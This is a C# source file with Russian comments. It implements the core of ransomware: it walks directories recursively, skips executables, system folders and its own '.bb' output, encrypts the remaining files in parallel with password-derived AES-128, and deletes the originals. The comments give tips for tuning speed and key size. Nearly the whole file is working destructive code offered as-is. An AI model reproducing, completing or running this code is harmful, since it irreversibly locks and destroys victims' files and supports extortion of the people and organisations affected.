using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Threading.Tasks.Dataflow;

namespace FFixer
{
    internal class Control
    {

        // Ищем файлы и отбираем их по паттерну.
        public static List<string> GetFiles(string path, string[] searchPatterns)
        {
            var files = new List<string>();
            var directories = new string[] { };

            try
            {
                var directoryInfo = new DirectoryInfo(path);
                var fileInfos = directoryInfo.EnumerateFiles("*", SearchOption.TopDirectoryOnly);

                foreach (var fileInfo in fileInfos)
                {
                    if (searchPatterns.Any(sp => fileInfo.Name.EndsWith(sp, StringComparison.InvariantCultureIgnoreCase)))
                    {
                        continue;
                    }

                    files.Add(fileInfo.FullName);
                }

                directories = directoryInfo.EnumerateDirectories().Select(d => d.FullName).ToArray();
            }
            catch (UnauthorizedAccessException) { }

            var subFiles = new List<string>();

            Parallel.ForEach(directories, directory =>
            {
                try
                {
                    subFiles.AddRange(GetFiles(directory, searchPatterns));
                }
                catch (UnauthorizedAccessException) { }
            });

            lock (files)
            {
                files.AddRange(subFiles);
            }

            return files;
        }

        // Функция в которой я запускаю сам отбор файлов на шифрование 
        public static void EncryptDirectory(string directoryPath, string password)
        {
            // Это файлы и папки которые шифровать не надо, ибо теряеться скорость шифрования из-за этого, да и смысла нет.
            var searchPatterns = new string[] { ".exe", ".dll", ".sys", ".bb", ".dat", ".log" };
            var ignoreFolders = new string[] { @"\Windows\", @"\WindowsApps\", @"\Program file\", @"\Program file (x86)\", @"\ProgramData\" };

            var files = GetFiles(directoryPath, searchPatterns)
                .AsParallel()
                .WithDegreeOfParallelism(Environment.ProcessorCount)
                .Where(f => !ignoreFolders.Any(f.Contains))
                .ToList();

            var options = new ExecutionDataflowBlockOptions
            {
                MaxDegreeOfParallelism = Environment.ProcessorCount
            };

            var transformBlock = new TransformBlock<string, string>(
                async file =>
                {
                    await EncryptFileAsync(file, password);
                    Console.WriteLine($"Encrypted file: {file}");
                    return file;
                },
                options);

            var deleteBlock = new ActionBlock<string>(
                file =>
                {
                    try
                    {
                        File.Delete(file);
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine($"Error deleting file {file}: {ex.Message}");
                    }
                },
                options);

            transformBlock.LinkTo(deleteBlock, new DataflowLinkOptions { PropagateCompletion = true });

            foreach (var file in files)
            {
                transformBlock.Post(file);
            }

            transformBlock.Complete();
            deleteBlock.Completion.Wait();
        }

        public static int re = 0;
        
        // Функция шифрования файлов.
        private static async Task EncryptFileAsync(string filePath, string password)
        {
            try
            {
                byte[] salt = GenerateRandomBytes(32);
                byte[] key = GenerateKey(password, salt);
                byte[] iv = GenerateRandomBytes(16);

                using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
                {
                    aes.Key = key;
                    aes.IV = iv;

                    using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                    using (FileStream outputFileStream = new FileStream(filePath + ".bb", FileMode.Create, FileAccess.Write))
                    using (CryptoStream cryptoStream = new CryptoStream(outputFileStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        await outputFileStream.WriteAsync(salt, 0, salt.Length);
                        await outputFileStream.WriteAsync(iv, 0, iv.Length);

                        await inputFileStream.CopyToAsync(cryptoStream);
                        re++;
                    }
                }
            }
            catch { }
        }

        private static readonly RNGCryptoServiceProvider _rng = new RNGCryptoServiceProvider();

        public static byte[] GenerateRandomBytes(int length)
        {
            byte[] randomBytes = new byte[length];
            _rng.GetBytes(randomBytes);
            return randomBytes;
        }

        // Генерируем ключ.
        // Количество итераций можете изменить
        // От размера ключа зависит тип шифрования, сейчас стоит 128 т.е AES-128.
        // Можете поставить 256, но это увеличит время шифрования
        private static byte[] GenerateKey(string password, byte[] salt)
        {
            const int Iterations = 1000;
            const int KeySize = 128;
            using (var pbkdf2 = new Rfc2898DeriveBytes(password, salt, Iterations))
            {
                return pbkdf2.GetBytes(KeySize / 8);
            }
        }
    }
}